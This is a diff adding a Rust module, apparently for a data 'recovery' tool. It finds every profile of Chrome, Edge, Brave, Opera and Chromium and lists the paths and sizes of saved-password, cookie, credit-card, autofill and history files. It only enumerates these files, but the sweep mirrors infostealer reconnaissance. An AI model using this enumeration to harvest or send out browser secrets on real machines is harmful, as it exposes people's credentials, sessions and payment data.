@@ -1,0 +1,221 @@
+use crate::recovery::context::RecoveryContext;
+use crate::recovery::task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask};
+use async_trait::async_trait;
+use std::path::{Path, PathBuf};
+use std::sync::Arc;
+use tokio::fs;
+use tracing::{debug, warn};
+
+#[derive(Clone, Copy, Debug)]
+pub enum BrowserDataKind {
+    Passwords,
+    Bookmarks,
+    History,
+    Cookies,
+    CreditCards,
+    Autofill,
+}
+
+impl BrowserDataKind {
+    pub const fn all() -> [Self; 6] {
+        [
+            Self::Passwords,
+            Self::Bookmarks,
+            Self::History,
+            Self::Cookies,
+            Self::CreditCards,
+            Self::Autofill,
+        ]
+    }
+
+    pub const fn label(&self) -> &'static str {
+        match self {
+            Self::Passwords => "Passwords",
+            Self::Bookmarks => "Bookmarks",
+            Self::History => "History",
+            Self::Cookies => "Cookies",
+            Self::CreditCards => "Credit Cards",
+            Self::Autofill => "Autofill",
+        }
+    }
+
+    pub const fn file_names(&self) -> &'static [&'static str] {
+        match self {
+            Self::Passwords => &["Login Data"],
+            Self::Bookmarks => &["Bookmarks"],
+            Self::History => &["History"],
+            Self::Cookies => &["Cookies"],
+            Self::CreditCards => &["Web Data", "Web Data-journal"],
+            Self::Autofill => &["Web Data", "Web Data-journal"],
+        }
+    }
+}
+
+#[derive(Clone, Copy, Debug)]
+pub enum BrowserName {
+    Chrome,
+    Edge,
+    Brave,
+    Opera,
+    Chromium,
+}
+
+impl BrowserName {
+    pub fn label(&self) -> &'static str {
+        match self {
+            BrowserName::Chrome => "Google Chrome",
+            BrowserName::Edge => "Microsoft Edge",
+            BrowserName::Brave => "Brave Browser",
+            BrowserName::Opera => "Opera Browser",
+            BrowserName::Chromium => "Chromium",
+        }
+    }
+}
+
+#[derive(Clone, Debug)]
+pub struct BrowserProfile {
+    pub browser: BrowserName,
+    pub profile_name: String,
+    pub path: PathBuf,
+}
+
+impl BrowserProfile {
+    pub async fn discover_for_root(browser: BrowserName, root: &Path) -> Vec<Self> {
+        let mut profiles = Vec::new();
+
+        let mut dir = match fs::read_dir(root).await {
+            Ok(dir) => dir,
+            Err(err) => {
+                debug!(browser=?browser, path=?root, error=?err, "browser root missing");
+                return profiles;
+            }
+        };
+
+        while let Ok(Some(entry)) = dir.next_entry().await {
+            if let Ok(metadata) = entry.metadata().await {
+                if metadata.is_dir() {
+                    let profile_name = entry.file_name().to_string_lossy().into_owned();
+                    profiles.push(Self {
+                        browser,
+                        profile_name,
+                        path: entry.path(),
+                    });
+                }
+            }
+        }
+
+        let default_profile = root.join("Default");
+        if profiles
+            .iter()
+            .all(|profile| profile.profile_name != "Default")
+        {
+            if let Ok(metadata) = fs::metadata(&default_profile).await {
+                if metadata.is_dir() {
+                    profiles.push(Self {
+                        browser,
+                        profile_name: "Default".into(),
+                        path: default_profile,
+                    });
+                }
+            }
+        }
+
+        profiles
+    }
+}
+
+pub struct BrowserRecoveryTask {
+    profile: BrowserProfile,
+    kind: BrowserDataKind,
+}
+
+impl BrowserRecoveryTask {
+    pub fn new(profile: BrowserProfile, kind: BrowserDataKind) -> Self {
+        Self { profile, kind }
+    }
+}
+
+#[async_trait]
+impl RecoveryTask for BrowserRecoveryTask {
+    fn label(&self) -> String {
+        format!(
+            "{browser}/{profile} - {kind}",
+            browser = self.profile.browser.label(),
+            profile = self.profile.profile_name,
+            kind = self.kind.label()
+        )
+    }
+
+    fn category(&self) -> RecoveryCategory {
+        RecoveryCategory::Browsers
+    }
+
+    async fn run(&self, _ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
+        let mut artifacts = Vec::new();
+
+        for file_name in self.kind.file_names().iter() {
+            let candidate = self.profile.path.join(file_name);
+            match fs::metadata(&candidate).await {
+                Ok(metadata) if metadata.is_file() => {
+                    artifacts.push(RecoveryArtifact {
+                        label: self.kind.label().to_string(),
+                        path: candidate.clone(),
+                        size_bytes: metadata.len(),
+                        modified: metadata.modified().ok(),
+                    });
+                }
+                Ok(_) => {
+                    warn!(path=?candidate, "expected file but found directory");
+                }
+                Err(err) => {
+                    debug!(path=?candidate, error=?err, "missing browser artifact");
+                }
+            }
+        }
+
+        Ok(artifacts)
+    }
+}
+
+pub async fn default_browser_tasks(ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
+    let mut tasks: Vec<Arc<dyn RecoveryTask>> = Vec::new();
+
+    for (browser, root) in browser_data_roots(ctx) {
+        let profiles = BrowserProfile::discover_for_root(browser, &root).await;
+        for profile in profiles {
+            for kind in BrowserDataKind::all() {
+                let task: Arc<dyn RecoveryTask> =
+                    Arc::new(BrowserRecoveryTask::new(profile.clone(), kind));
+                tasks.push(task);
+            }
+        }
+    }
+
+    tasks
+}
+
+pub fn browser_data_roots(ctx: &RecoveryContext) -> Vec<(BrowserName, PathBuf)> {
+    vec![
+        (
+            BrowserName::Chrome,
+            ctx.local_data_dir.join("Google/Chrome/User Data"),
+        ),
+        (
+            BrowserName::Edge,
+            ctx.local_data_dir.join("Microsoft/Edge/User Data"),
+        ),
+        (
+            BrowserName::Brave,
+            ctx.local_data_dir
+                .join("BraveSoftware/Brave-Browser/User Data"),
+        ),
+        (
+            BrowserName::Opera,
+            ctx.roaming_data_dir.join("Opera Software/Opera Stable"),
+        ),
+        (
+            BrowserName::Chromium,
+            ctx.local_data_dir.join("Chromium/User Data"),
+        ),
+    ]
+}
